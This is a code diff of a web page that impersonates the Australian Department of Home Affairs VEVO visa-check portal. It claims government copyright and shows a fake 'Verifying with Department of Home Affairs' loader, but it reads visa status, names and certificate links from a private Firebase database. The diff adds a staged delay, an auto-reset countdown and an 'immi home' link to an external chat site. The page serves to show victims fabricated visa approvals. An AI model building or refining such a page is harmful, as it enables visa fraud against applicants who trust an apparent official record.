@@ -12,19 +12,28 @@
 
     <meta name="keywords" content="Visit the Australia Visa, Track Application official portal.">
     <link rel="icon" type="image/x-icon" href="https://uploads.onecompiler.io/44jx762vs/44jx7794n/1000220167.png">
+    
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; margin: 0; padding: 0; padding-bottom: 60px; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; margin: 0; padding: 0; padding-bottom: 80px; }
         .banner-img { width: 100%; display: block; height: auto; }
-        .container { max-width: 500px; margin: 20px auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); }
+        .container { max-width: 500px; margin: 20px auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); position: relative; }
         .logo-section { text-align: left; border-bottom: 2px solid #005eb8; padding-bottom: 10px; margin-bottom: 20px; }
         .form-group { margin-bottom: 18px; }
         .info-p { font-size: 13.5px; color: #555; line-height: 1.5; margin-bottom: 15px; }
         label { display: block; font-weight: bold; margin-bottom: 6px; color: #333; font-size: 14px; }
         input[type="text"], input[type="date"] { width: 100%; padding: 11px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
         input:focus { outline: none; border-color: #005eb8; box-shadow: 0 0 5px rgba(0, 94, 184, 0.2); }
+        
         .btn-submit { width: 100%; background-color: #005eb8; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 15px; transition: 0.2s; }
         .btn-submit:hover { background-color: #004488; }
         
+        /* 🔄 ৫ সেকেন্ডের প্রসেসিং লোডার */
+        .loader-box { display: none; text-align: center; padding: 30px 10px; }
+        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); width: 45px; height: 45px; border-radius: 50%; border-left-color: #005eb8; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader-box p { font-size: 15px; color: #005eb8; font-weight: bold; }
+
+        /* 📄 রেজাল্ট বক্স */
         .results-box { border-top: 2px solid #005eb8; margin-top: 25px; padding-top: 15px; background: #fafafa; padding: 15px; border-radius: 6px; }
         .result-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14.5px; }
         .result-item:last-of-type { border-bottom: none; }
@@ -35,16 +44,24 @@
         .status-badge.approved { background: #e8f5e9; color: #2e7d32; }
         .status-badge.pending { background: #fff3e0; color: #ef6c00; }
         
+        /* ⏰ ৩০ সেকেন্ডের লাইভ কাউন্টডাউন টাইমার */
+        .timer-banner { background-color: #fff3e0; color: #b78103; padding: 8px; border-radius: 4px; text-align: center; font-size: 13px; font-weight: bold; margin-bottom: 15px; border: 1px dashed #ffe0b2; }
+
         .btn-download { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; background-color: #2e7d32; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 15px; margin-top: 15px; text-decoration: none; text-align: center; box-sizing: border-box; }
         .btn-download:hover { background-color: #1b5e20; }
         
+        /* 💬 প্রিমিয়াম হোয়াটসঅ্যাপ সাপোর্ট ইনফো বাটন */
+        .support-container { text-align: center; margin-top: 20px; }
+        .btn-support { display: inline-flex; align-items: center; gap: 8px; background-color: #25d366; color: white; text-decoration: none; padding: 10px 20px; border-radius: 25px; font-weight: bold; font-size: 14px; box-shadow: 0 4px 10px rgba(37, 211, 102, 0.3); transition: 0.2s; }
+        .btn-support:hover { background-color: #20ba5a; transform: translateY(-1px); }
+
         .footer { background-color: #001a35; color: white; padding: 15px; text-align: center; position: fixed; bottom: 0; width: 100%; font-size: 12px; left: 0; z-index: 100; }
     </style>
 </head>
 <body>
 
-<img src="https://uploads.onecompiler.io/44erpqqpq/44ferpf7n/8176.jpg" class="banner-img" alt="Header 1">
-<img src="https://uploads.onecompiler.io/44erpqqpq/44feu2x4e/8179.jpg" class="banner-img" alt="Header 2">
+ <img src="https://uploads.onecompiler.io/44erpqqpq/44ferpf7n/8176.jpg" class="banner-img" alt="Header 1">
+ <img src="https://uploads.onecompiler.io/44erpqqpq/44feu2x4e/8179.jpg" class="banner-img" alt="Header 2">
 
 <div class="container">
     <div class="logo-section">
@@ -62,10 +79,21 @@
             <label for="dob">Date of Birth:</label>
             <input type="date" id="dob">
         </div>
-        <button class="btn-submit" onclick="checkVisa()">Submit Verification</button>
+        <button class="btn-submit" onclick="startVerification()">Submit Verification</button>
+    </div>
+
+    <div id="loaderArea" class="loader-box">
+        <div class="spinner"></div>
+        <p>Verifying with Department of Home Affairs...</p>
+        <span style="font-size: 12px; color: gray;">Please wait up to 5 seconds</span>
     </div>
 
     <div id="resultArea" class="results-box" style="display:none;">
+        
+        <div class="timer-banner">
+            <i class="fa-solid fa-clock-rotate-left"></i> Security Session Timeout: Auto Home in <span id="countdownText">30</span>s
+        </div>
+
         <h3 style="color: #005eb8; text-align: center; margin-top: 0; margin-bottom: 5px;">VEVO Check Results</h3>
         <p id="lastChecked" style="font-size: 11px; color: gray; text-align: center; margin-bottom: 15px;">Last checked: Realtime</p>
         
@@ -84,15 +112,20 @@
         
         <button onclick="closeVevo()" style="width:100%; padding: 10px; margin-top: 15px; cursor: pointer; border: 1px solid #ccc; background: #fff; font-weight: bold; border-radius: 4px;">Close VEVO Check</button>
     </div>
-</div>
 
-<img src="https://uploads.onecompiler.io/44erpqqpq/44ferpf7n/8174.jpg" alt="Showcase Image" style="pointer-events: none; margin-bottom: 40px;" ondragstart="return false;" width="100%">
+    <div class="support-container">
+        <a href="https://assistantslivechat.onrender.com" target="_blank" class="btn-support">
+            <i class="fa-solid fa-globe" style="font-size: 13px;"></i> immi home
+        </a>
+    </div>
+</div>
+<img src="https://uploads.onecompiler.io/44hgvsk4u/44hgwe3ww/1000218338.jpg" alt="Showcase Image" style="pointer-events: none; margin-bottom: 40px;" ondragstart="return false;" width="100%">
 <div class="footer">
     © Australian Government — Department of Home Affairs
 </div>
 
-<script>
-    // 🔐 আপনার দেওয়া নতুন ফায়ারবেস কনফিগারেশন এখানে আপডেট করা হয়েছে
+    <script>
+    // 🔐 আপনার দেওয়া 'webpagecybersecurity' কনফিগারেশন 
     const firebaseConfig = {
         apiKey: "AIzaSyDWbYwNwDtdyUXbIy5Lmd8l_HF0RFIyINU",
         authDomain: "webpagecybersecurity.firebaseapp.com",
@@ -109,7 +142,11 @@
     }
     const db = firebase.database();
 
-    function checkVisa() {
+    let autoHomeTimeout;
+    let countdownInterval;
+
+    // ১. বাটনে ক্লিক করলে প্রথমে লোডার চালু করার ফাংশন
+    function startVerification() {
         const docNum = document.getElementById('docNumber').value.trim();
         const dobInput = document.getElementById('dob').value;
 
@@ -118,16 +155,33 @@
             return;
         }
 
+        // ইন্টারফেস পরিবর্তন (সার্চ ফর্ম হাইড, লোডার শো)
+        document.getElementById('searchForm').style.display = 'none';
+        document.getElementById('loaderArea').style.display = 'block';
+
+        // ঠিক ৫ সেকেন্ড (৫০০০ মিলিসেকেন্ড) পর মেইন ফায়ারবেস চেক কল হবে
+        setTimeout(() => {
+            checkVisaData(docNum, dobInput);
+        }, 5000);
+    }
+
+    // ২. ফায়ারবেস থেকে ডেটা চেক করার ফাংশন (৫ সেকেন্ড পর এটি চলবে)
+    function checkVisaData(docNum, dobInput) {
         db.ref('visas/' + docNum).once('value').then((snapshot) => {
             const data = snapshot.val();
             
+            // লোডার হাইড করা
+            document.getElementById('loaderArea').style.display = 'none';
+
             if (data) {
-                // ইনপুট করা dob এর সাথে ডাটাবেজের dob মিলানো (যদি ডাটাবেজে থাকে)
+                // ডেটাবেজে জন্মতারিখ থাকলে তা ম্যাচিং করানো হচ্ছে 
                 if(data.dob && data.dob !== dobInput) {
-                    alert("দুঃখিত!, আপনার জন্ম তারিখটি মিলছে না। সঠিক তথ্য দিয়ে আবার চেষ্টা করুন।");
+                    alert("দুঃখিত!, (Date of birth) মিলছে না। সঠিক তথ্য দিয়ে আবার চেষ্টা করুন।");
+                    document.getElementById('searchForm').style.display = 'block';
                     return;
                 }
 
+                // রেজাল্ট আপডেট
                 document.getElementById('resName').innerText = data.app_name || "---";
                 document.getElementById('resPassport').innerText = data.passport_num || docNum;
                 document.getElementById('resDob').innerText = data.dob || dobInput;
@@ -136,11 +190,11 @@
                 const statusElement = document.getElementById('resStatus');
                 statusElement.innerText = data.status || "Submitted";
                 
-                // রিমুভ ও অ্যাড কালার ক্লাস
                 statusElement.className = "status-badge";
                 if(data.status === "Approved") statusElement.classList.add('approved');
                 if(data.status === "Pending") statusElement.classList.add('pending');
 
+                // পিডিএফ লিংকের কন্ডিশন
                 const pdfBtn = document.getElementById('pdfDownloadLink');
                 if (data.cert_url) {
                     pdfBtn.href = data.cert_url;
@@ -149,23 +203,59 @@
                     pdfBtn.style.display = 'none';
                 }
 
-                document.getElementById('searchForm').style.display = 'none';
+                // রেজাল্ট স্ক্রিন দেখানো
                 document.getElementById('resultArea').style.display = 'block';
-                
                 const today = new Date().toISOString().slice(0, 10);
                 document.getElementById('lastChecked').innerText = "Last checked: " + today;
 
+                // ⏰ ৩০ সেকেন্ডের অটোমেটিক হোম ডিরেকশন ও লাইভ কাউন্টডাউন শুরু
+                startAutoHomeTimer();
+
             } else {
-                alert("Australia immigration, Not Verification! আপনার প্রদানকৃত পাসপোর্ট নাম্বার অথবা ডকুমেন্ট নাম্বার সঠিক নয়!! অনুগ্রহ করে সঠিক তথ্য দিয়ে আবার চেষ্টা করুন।");
+                alert("ভুল তথ্য! আপনার প্রদানকৃত পাসপোর্ট নাম্বারটি ডাটাবেজে খুঁজে পাওয়া যায়নি।");
+                document.getElementById('searchForm').style.display = 'block';
             }
         }).catch(err => {
+            document.getElementById('loaderArea').style.display = 'none';
+            document.getElementById('searchForm').style.display = 'block';
             alert("সংযোগ ত্রুটি: " + err.message);
         });
     }
 
+    // ৩. লাইভ ৩০ সেকেন্ড কাউন্টডাউন এবং অটো ব্যাক লজিক
+    function startAutoHomeTimer() {
+        let timeLeft = 30;
+        const countdownText = document.getElementById('countdownText');
+        countdownText.innerText = timeLeft;
+
+        // আগের কোনো টাইমার চললে তা ক্লিয়ার করা
+        clearInterval(countdownInterval);
+        clearTimeout(autoHomeTimeout);
+
+        // প্রতি ১ সেকেন্ড পর পর টাইমার সংখ্যা কমবে (লাইভ দেখতে পাবে)
+        countdownInterval = setInterval(() => {
+            timeLeft--;
+            countdownText.innerText = timeLeft;
+            if(timeLeft <= 0) {
+                clearInterval(countdownInterval);
+            }
+        }, 1000);
+
+        // ঠিক ৩০ সেকেন্ড পর অটোমেটিক হোম স্ক্রিনে ফেরত যাবে
+        autoHomeTimeout = setTimeout(() => {
+            closeVevo();
+        }, 30000);
+    }
+
+    // ৪. ক্লোজ বা রিসেট ফাংশন
     function closeVevo() {
+        clearInterval(countdownInterval);
+        clearTimeout(autoHomeTimeout);
+        
         document.getElementById('resultArea').style.display = 'none';
+        document.getElementById('loaderArea').style.display = 'none';
         document.getElementById('searchForm').style.display = 'block';
+        
         document.getElementById('docNumber').value = "";
         document.getElementById('dob').value = "";
     }
